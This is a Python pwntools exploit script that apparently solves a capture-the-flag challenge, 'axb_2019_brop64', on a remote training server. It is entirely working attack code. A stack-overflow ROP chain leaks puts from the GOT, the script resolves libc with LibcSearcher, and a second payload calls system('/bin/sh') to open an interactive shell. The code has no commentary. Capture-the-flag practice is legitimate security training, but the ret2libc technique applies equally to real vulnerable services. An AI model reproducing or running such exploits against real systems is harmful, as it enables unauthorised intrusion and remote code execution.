#! /usr/bin/python

from pwn import *
from LibcSearcher import *

#p = process('./axb_2019_brop64')
p = remote('node3.buuoj.cn',26951)
elf = ELF('./axb_2019_brop64')
context.log_level = 'debug'

puts_plt = elf.symbols['puts']
puts_got = elf.got['puts']
pop_rdi = 0x0000000000400963
repeter = 0x400845
offset = 216

p.recvuntil('Please tell me:')
payload = 'A' * offset + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(repeter)
p.sendline(payload)
puts = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))

libc = LibcSearcher('puts',puts)
libc_base = puts - libc.dump('puts')
system = libc_base + libc.dump('system')
sh = libc_base + libc.dump('str_bin_sh')

p.recvuntil('Please tell me:')
payload = 'A' * offset + p64(pop_rdi) + p64(sh) + p64(system) + p64(repeter)
p.sendline(payload)

p.interactive()
